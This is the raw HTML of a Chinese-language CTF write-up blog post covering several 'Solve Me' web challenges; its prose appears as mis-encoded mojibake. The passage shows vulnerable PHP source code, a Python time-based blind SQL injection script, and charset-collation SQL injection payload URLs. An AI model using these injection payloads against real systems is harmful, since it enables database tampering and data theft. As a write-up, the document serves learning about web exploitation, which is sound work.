class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘æ²¡ç©è¿‡sqliteï¼Œä½†æ˜¯æ„Ÿè§‰è¿™é‡Œä¸€å®šè¦æ»¡è¶³adminè¿™ä¸ªä¸œè¥¿ï¼Œå› ä¸ºqueryå‡½æ•°åé¢çš„ä¸œè¥¿ï¼Œä½†æ˜¯è¿™é‡Œçš„è¿‡æ»¤æ˜¯æ­£æ•´ä¸€ä¸ªè¯çš„è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨sqliteçš„è¿æ¥è¯<code>||</code>å»å®ç°ç»•è¿‡ï¼Œä½†æ˜¯å¯¹äºmysqlå­—ç¬¦ä¸²çš„æ‹¼æ¥åªèƒ½ç”¨<code>concat</code>å‡½æ•°å»æ‹¼æ¥<br>æ‰€ä»¥æœ€åçš„payloadï¼š<code>ad&#39;||&#39;min</code></p><h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">            $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">            mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®ä¹Ÿæ˜¯å¾ˆéªšï¼Œæˆ‘ç¬¬ä¸€æ¬¡é‡è§è¿™ä¸€ç§ç±»å‹çš„é¢˜ç›®ï¼Œåˆ©ç”¨æ¥äº†phpä»¥åŠmysqlä¹‹é—´çš„å»¶æ—¶å…³ç³»å»ç»•è¿‡é‚£ä¸€ä¸ªå¯æ¶çš„12.ã€‚ã€‚<br>ä½†æ˜¯æ‰§è¡Œè¿‡ç¨‹è¿‡äºç¼“æ…¢å•Šï¼Œä¸»è¦æ˜¯ä¸¤ä¸ªå»¶æ—¶å¤ªè¿‡è€—æ—¶<br>æ¦‚è¿°ä¸€ä¸‹è¿™é¢˜ç›®çš„æ„æ€ä¼ å‚è¿›å»ä¹‹åï¼Œå¦‚æœæ²¡æœ‰å¯¹åº”çš„è¡¨å°±æ ¹æ®ä½ çš„ipåˆ›å»ºä¸€ä¸ªè¡¨ï¼Œå¹¶ä¸”è¿™ä¸ªè¡¨é‡Œé¢å«æœ‰ä¸€ä¸ªåä¸ºCOUNTçš„å­—æ®µï¼Œåˆå§‹å€¼ä¸º1ï¼Œåé¢å°±ä¸€ç›´å¾€è¿™é‡Œé¢çš„COUNT+1ï¼Œå¦‚æœåˆ°12çš„è¯å°±ä¼šæŠŠè¡¨åˆ æ‰é‡æ–°å†æ–°å»ºä¸€ä¸ªè¡¨ï¼Œæ‰€ä»¥å…³é”®æ˜¯ä»–çš„é€»è¾‘é¡ºåºå‡ºäº†é”™è¯¯ã€‚</p><p><code>åˆ¤æ–­countçš„å€¼â€“&gt;æ‰§è¡ŒSQLè¯­å¥â€“&gt;åŠ countå€¼</code></p><p>è¿™ä¸ªé€»è¾‘åœ¨æ‰§è¡Œè¯­å¥çš„æ—¶å€™æœ‰é—®é¢˜ï¼Œå½“count=11çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªsleep()æ—¶é—´å¾ˆé•¿çš„è¯­å¥ï¼Œè¯¥è¯·æ±‚å°±ä¼šé•¿æ—¶é—´åœåœ¨ æ‰§è¡ŒSQLè¯­å¥ æµç¨‹ä¸­ï¼Œå¦‚æœæ­¤æ—¶æˆ‘ä»¬å†å‘èµ·ä¸€æ¬¡æ­£å¸¸è¯·æ±‚ï¼Œåˆ¤æ–­countå€¼è¿˜æ˜¯11ï¼Œæ‰§è¡Œå®ŒSQLè¯­å¥ä¹‹åcount+1=12ï¼Œå†å½“ä¸Šä¸€æ¡SQLè¯­å¥æ‰§è¡Œå®Œæ¯•åcountå†åŠ 1ç­‰äº13ï¼Œäºæ˜¯ä¹‹åå°±å¯ä»¥æ— é™åˆ¶æäº¤è¯·æ±‚äº†ï¼Œç„¶ååœ¨åˆ©ç”¨ç›²æ³¨æ¥è·å¾—answerï¼Œè¿™ç¡®å®éªšæ°”<br>å°è„šæœ¬ï¼Œæœ€å¥½è¿˜æ˜¯æŠŠheaderå•¥çš„éƒ½å¼„è¿›å»ï¼Œæ¯•ç«Ÿæ˜¯é ipå»ºè¡¨çš„ï¼Œè¿™ä¸ªä¸œè¥¿è·‘å¾—å¾ˆæ…¢ä¸å€¼å¾—ï¼Œè€Œä¸”ä¸€ç›´éƒ½è·‘çš„é”™çš„ç­”æ¡ˆï¼ŒQAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"</span>,</span><br><span class="line">     <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">     <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Referer"</span>: <span class="string">"http://iamslowly.thinkout.rf.gd/"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"__test=4e8126e93f7b5a4448c7e3c1f0b7853e"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(30),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">29</span>).content</span><br><span class="line">            <span class="comment">#print(content[:10])</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+]Waiting!'</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Cheap-Lottery"><a href="#Cheap-Lottery" class="headerlink" title="Cheap Lottery"></a>Cheap Lottery</h3><p>è¿™ä¸ªé¢˜ç›®ä¸€å¼€å§‹ç”¨æ‰«æå™¨æ‰«ä¸€ä¸‹å‘ç°é‡Œé¢å­˜åœ¨robots.txtæ‰“å¼€å‘ç°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backup/</span><br></pre></td></tr></table></figure><p>è¿›å»backupå‘ç°å‡ ä¸ªæ–‡ä»¶</p><p>ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä»½æºç </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span> (</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`time`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`nums`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span></span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`name`</span> (<span class="string">`name`</span>);</span><br></pre></td></tr></table></figure><p>ä½œä¸ºèœé¸Ÿæ„Ÿè§‰æ˜¯SQLæ³¨å…¥ï¼Œä½†æ— ä»ä¸‹æ‰‹ï¼ŒçŸ¥é“å‘ç°åŸæ¥æ–¹æ–¹åœŸå­¦é•¿æ—©å°±å†™è¿‡è¿™é¢˜çš„é¢˜è§£<a href="https://www.anquanke.com/post/id/101939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101939</a><br>è¿™æ³¢éªšæ“ä½œè¿˜æ˜¯6ï¼Œè¿ç”¨äº†å­—ç¬¦é›†å»ç»•è¿‡</p><p>è€Œä¸”pç¥ä¹Ÿå‘è¿‡ç±»ä¼¼çš„æ–‡ç« (tql,QAQ)<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p><p>å…ˆè®²ä¸€ä¸‹è¿™ä¸€æ®µä»£ç çš„æ„æ€ï¼Œå‘ç°éª†éª†å¤§ä½¬æ—©å°±åšè¿‡è¿™é¢˜è€Œä¸”æµç¨‹å›¾éƒ½ç”»å¥½äº†ï¼Œæˆ‘å°±ç›´æ¥è´´å›¾å§ã€‚ã€‚ç®€å•ç²—æš´<br><img src="https://s1.ax1x.com/2018/04/03/CpBkLt.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><p>æˆ‘ä»¬è¦åˆ©ç”¨çš„ç‚¹å°±æ˜¯è¿™ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nums = preg_replace(<span class="string">"/[a-zA-Z\[\]\=]/"</span>, <span class="string">""</span>, $url_query);</span><br><span class="line">$nums = strtr($nums, <span class="string">"&amp;"</span>, <span class="string">","</span>);</span><br><span class="line">$sql-&gt;query(<span class="string">"INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');"</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¾€æ•°æ®åº“é‡Œé¢æ·»åŠ æ•°æ®ï¼Œåªè¦æˆ‘ä»¬å¾€é‡Œé¢æ·»åŠ è‡ªå·±è§„å®šçš„å€¼ï¼Œç„¶åå†åœ¨å¦ä¸€å¤„ä»¥åŒä¸€ipåœ°å€è¿›è¡Œè®¿é—®(ä¸è´­ä¹°)ä¸å°±å¯ä»¥ç›´æ¥è¿›åˆ°checkæ¨¡å—äº†ã€‚ã€‚<br>æ„æ€å°±æ˜¯è¿™æ ·<br>å¼€å§‹æ•°æ®åº“é‡Œé¢æ˜¯è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69,69,69,69,69'</span>);</span><br></pre></td></tr></table></figure><p>åæ¥æˆ‘ä»¬æ„é€ ï¼Œä½¿æ•°æ®åº“ä¸€å¼€å§‹å°±å­˜åœ¨è¿™æ ·çš„å€¼ï¼Œæˆ‘ä»¬ä¸‹ä¸€æ¬¡è®¿é—®çš„æ—¶å€™å°±åæ­£è¨€é¡ºçš„æ˜¯ä¹°æ­£ç¡®äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69'</span>),(<span class="string">'admin1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>),(<span class="string">'guest_1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>)<span class="comment">#',69,69,69,69');</span></span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥åæ­£è¨€é¡ºåœ°ä½¿<code>bingo</code>è¿™ä¸ªå€¼ç­‰äº5ï¼Œç„¶åå°±è¾“å‡ºflagäº†ï¼Œä¹Ÿå°±æ˜¯è¿›å…¥ä¸‹é¢è¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$bingo = <span class="number">0</span>;</span><br><span class="line">$nums_admin = explode(<span class="string">","</span>, $row_admin[<span class="string">'nums'</span>]); <span class="comment">// admin_*</span></span><br><span class="line">$nums_guest = explode(<span class="string">","</span>, $row_guest[<span class="string">'nums'</span>]); <span class="comment">// guest_*</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i)&#123;</span><br><span class="line"><span class="keyword">for</span>($k = <span class="number">0</span>; $k &lt; <span class="number">5</span>; ++$k)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k])&#123;</span><br><span class="line">++$bingo;</span><br><span class="line"><span class="keyword">unset</span>($nums_guest[$k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($bingo == <span class="number">5</span>)&#123; <span class="comment">// correct all</span></span><br><span class="line">$msg = <span class="string">"Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;/code&gt;."</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬è¦ç½‘å…³é”®çš„ä»£ç æ³¨å…¥è‡ªå·±æƒ³è¦çš„ä¸œè¥¿ï¼Œå°±å¿…é¡»å¾—ç»•è¿‡å­—æ¯è¿™ä¸ªæ­¥éª¤ï¼Œè¿™é‡Œå¼€å§‹åŠç‰µæ¶‰åˆ°å­—ç¬¦é›†çš„é—®é¢˜äº†ã€‚</p><p>æ€»ç»“ä¸€ä¸‹é‚£å‡ ç¯‡åšå®¢çœ‹åˆ°çš„ç‚¹<br>MySQLä¸­çš„å­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Serveræ”¶åˆ°è¯·æ±‚æ—¶å°†è¯·æ±‚æ•°æ®ä»character_set_clientè½¬æ¢ä¸ºcharacter_set_connectionï¼›</span><br><span class="line">2. è¿›è¡Œå†…éƒ¨æ“ä½œå‰å°†è¯·æ±‚æ•°æ®ä»character_set_connectionè½¬æ¢ä¸ºå†…éƒ¨æ“ä½œå­—ç¬¦é›†ï¼Œå…¶ç¡®å®šæ–¹æ³•å¦‚ä¸‹ï¼š</span><br><span class="line">ä½¿ç”¨æ¯ä¸ªæ•°æ®å­—æ®µçš„CHARACTER SETè®¾å®šå€¼ï¼›</span><br><span class="line">â€¢ è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®è¡¨çš„DEFAULT CHARACTER SETè®¾å®šå€¼(MySQLæ‰©å±•ï¼ŒéSQLæ ‡å‡†)ï¼›</span><br><span class="line">â€¢ è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®åº“çš„DEFAULT CHARACTER SETè®¾å®šå€¼ï¼›</span><br><span class="line">â€¢ è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨character_set_serverè®¾å®šå€¼ã€‚</span><br><span class="line">3. å°†æ“ä½œç»“æœä»å†…éƒ¨æ“ä½œå­—ç¬¦é›†è½¬æ¢ä¸ºcharacter_set_results</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; å†…éƒ¨æ“ä½œå­—ç¬¦é›†</span><br></pre></td></tr></table></figure><p>è€Œä¸”pç¥è¯´çš„åœ¨MySQLé‡Œé¢çš„utf-8æ˜¯é˜‰å‰²ç‰ˆï¼Œæœ€é•¿åªæ”¯æŒä¸‰ä¸ªå­—èŠ‚ï¼Œ<br>å¦‚æœä½ éœ€è¦Mysqlæ”¯æŒå››å­—èŠ‚çš„utf-8ï¼Œå¯ä»¥ä½¿ç”¨utf8mb4ç¼–ç ã€‚<br>ä½†æ˜¯è¿™ä¸ªç‚¹è·Ÿè¿™é¢˜æ— å…³ï¼Œè¿™ä¸ªç‚¹ç”¨åœ¨è®©æ•°æ®åº“è¯¯è®¤ä¸ºè¯¥å­—æ¯ä¸å­˜åœ¨ç›´æ¥èˆå¼ƒæ‰çš„æƒ…å†µ</p><p>ç¬¬äºŒä¸ªç‚¹æ˜¯<br>mysql æœ‰ä¸¤ä¸ªæ”¯æŒ unicode çš„ character set:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ucs2: ä½¿ç”¨ 16 bits æ¥è¡¨ç¤ºä¸€ä¸ª unicode å­—ç¬¦ã€‚</span><br><span class="line">utf8: ä½¿ç”¨ 1~3 bytes æ¥è¡¨ç¤ºä¸€ä¸ª unicode å­—ç¬¦ã€‚</span><br></pre></td></tr></table></figure><p>è€Œåœ¨æœ¬é¢˜ç›®ä¸­ï¼Œsqlæ–‡ä»¶ä¸­æ˜¾ç¤º</p><p><code>ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></p><p>å¾ˆæ˜¾ç„¶è¿™é‡Œæ˜¯utf8ï¼Œè€Œæˆ‘ä»¬ä¸€èˆ¬æ•°æ®åº“é»˜è®¤ä½¿ç”¨çš„æ˜¯utf8_general_ciï¼Œè€Œciæ˜¯æŒ‡case insensitiveçš„ç¼©å†™ï¼Œå³å¤§å°å†™ä¸æ•æ„Ÿ</p><p>è¿™æ ·ä¹Ÿè¡¨æ˜äº†ä¸ºä»€ä¹ˆå¹³å¸¸æˆ‘ä»¬åœ¨cmdå‘½ä»¤è¡Œä¸‹å†™æ•°æ®åº“å‘½ä»¤ä¸åŒºåˆ†å¤§å°å†™äº†</p><p>æ ¹æ®æ–¹æ–¹åœŸå­¦é•¿æ‰€è¯´çš„ï¼Œè¿™ç§æ¨¡å¼ç”±äºdiacritic orderingçš„æ’åºé—®é¢˜ä½¿å¾—è¯»éŸ³ç¬¦å·æœ€åè¢«è®¤å®šä¸ºè‹±æ–‡å­—æ¯</p><p>ä¹Ÿå°±æ˜¯å¯¹äºutf8_general_ciï¼Œè®¤ä¸ºä»¥ä¸‹æ ·ä¾‹æ˜¯ç›¸ç­‰çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ã„ = A</span><br><span class="line">Ã– = O</span><br><span class="line">Ãœ = U</span><br></pre></td></tr></table></figure><p>è€Œä¸”è¿˜ç»™å‡ºäº†è¿™ä¸ªè¶…çº§è…»å®³çš„è¡¨<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>è¡¨æ ¼ä¸Šæ–¹æ˜¯ unicode ç¼–ç ï¼Œä¸‹æ–¹æ˜¯ utf8 ç¼–ç </p><p>ç„¶åæ„é€ ä¸€ä¸‹adminè¿˜æœ‰guest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin: %C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1</span><br><span class="line">guest: %C4%9D%C3%B9%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$vps_ip = <span class="string">'ä½ çš„vpsåœ°å€'</span>;</span><br><span class="line">$time = time();</span><br><span class="line">    $url = <span class="string">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1'),('%C4%9D%C3%B9%C3%A8%C5%9B%C5%A3_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span>;</span><br><span class="line">    <span class="keyword">echo</span> $url;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ä½ çš„vpsä¸Šå†curlä¸€ä¸‹å°±å¾—åˆ°flagäº†</p><p><a href="https://imgchr.com/i/P2t4AI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2t4AI.md.png" alt="P2t4AI.md.png"></a></p><h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span 